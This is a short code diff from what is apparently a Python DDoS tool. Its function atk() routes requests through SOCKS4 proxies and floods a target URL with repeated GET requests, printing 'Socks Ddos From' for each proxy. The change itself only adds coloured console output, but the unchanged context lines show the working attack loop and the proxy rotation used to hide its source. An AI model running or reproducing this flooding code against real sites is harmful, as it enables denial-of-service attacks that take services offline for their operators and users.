@@ -59,7 +59,7 @@ def atk():
 		s.proxies['https'] = ("socks4h://"+str(proxy[0])+":"+str(proxy[1]))
 		try:
 			s.get(url)
-			print("Socks Ddos From ~ / " + str(proxy[0])+":"+str(proxy[1]))
+			print(Fore.BLUE + "Socks Ddos From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for y in range(pow):
 					s.get(url)
@@ -67,7 +67,7 @@ def atk():
 				s.close()
 		except:
 			s.close()
-			print("Socks Down !")
+			print(Fore.RED + "Socks Down !" + Fore.WHITE)
 
 
 if __name__ == "__main__":
